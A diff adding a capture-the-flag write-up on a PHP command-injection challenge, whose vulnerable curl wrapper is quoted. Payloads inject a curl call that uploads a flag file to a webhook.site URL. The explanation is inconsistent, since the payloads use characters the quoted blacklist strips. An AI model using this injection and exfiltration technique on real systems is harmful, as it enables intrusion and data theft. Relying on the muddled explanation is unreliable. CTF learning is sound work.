@@ -492,3 +492,101 @@ Flag: **umcs{GOT_PLT_8f925fb19309045dac4db4572435441d}**
 
 UMCS provide us `index.php` on their github
 
+---
+
+### Solution
+
+I was given this web page.
+
+![Healthcheck Interface](img/healthcheck.png)
+
+When viewing the page source from the given github, the `index.php` script was given.
+
+```bash
+<?php
+if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST["url"])) {
+    $url = $_POST["url"];
+
+    $blacklist = [PHP_EOL,'$',';','&','#','`','|','*','?','~','<','>','^','<','>','(', ')', '[', ']', '{', '}', '\\'];
+
+    $sanitized_url = str_replace($blacklist, '', $url);
+
+    $command = "curl -s -D - -o /dev/null " . $sanitized_url . " | grep -oP '^HTTP.+[0-9]{3}'";
+
+    $output = shell_exec($command);
+    if ($output) {
+        $response_message .= "<p><strong>Response Code:</strong> " . htmlspecialchars($output) . "</p>";
+    }
+}
+?>
+```
+
+The php command basically means that it accepts a url, then sanitizes it by removing the contents that is identified as a blacklisted element. Then it executes it as a “curl” shell command to check the http response.
+
+It blocks important characters like `$` and `;` which could create a new shell, or separate it to run a different command. So that means I am stuck with using  `Curl` command only.
+
+```bash
+curl -s -D - -o /dev/null “[sanitised url]" | grep -oP '^HTTP.+[0-9]{3}'
+```
+
+The `curl` command collects the `http` response, and discards all the remaining content. That means I can’t see the remaining web request content no matter what.
+
+After testing it, I can confirm the only information I can get directly from the website is the `http` request which is displayed like this.
+
+![http response](img/response.png)
+
+For me to exfiltrate any data from a web like this I need to use a [webhook](https://webhook.site/). So, after hours of trying I finally got a working webhook payload to send data and see if it could work.
+
+The command:
+
+```bash
+http://127.0.0.1/x$(curl --data "testtesttesttest" https://webhook.site/5af80e59-cbce-4dca-bca4-747e8397f71b)
+```
+
+![Webhook](img/webhook.png)
+
+Fortunately, it works. 
+
+Since we can’t spawn a web shell here because `$` and `;` is blocked, only `curl` commands are available to me.
+
+![Curl Documentation](img/curldocumentation.png)
+
+I can’t directly `cat` the flag, so the only option I have is to download the file and see it locally.
+
+I tested with using `-O` to try download the file but I doesn’t work.
+
+The only command usable command to download the flag is `-F`
+
+So, this is the final payload:
+
+```bash
+http://127.0.0.1/x$(curl -F file=@hopes_and_dreams https://webhook.site/5af80e59-cbce-4dca-bca4-747e8397f71b)
+```
+
+![Flag](img/flag6.png)
+
+Yahooo! got the flag!
+
+Flag: **umcs{n1c3_j0b_ste4l1ng_myh0p3_4nd_dr3ams}**
+
+### Straightforward
+### Description
+> Test out our game center. You'll have free claiming bonus for first timers!
+> 
+> **Author: vicevirus** Flag format: UMCS{...}
+> 
+> http://159.69.219.192:7859/
+
+`straightforward.zip`
+
+---
+
+### Solution
+
+
+
+
+
+
+
+
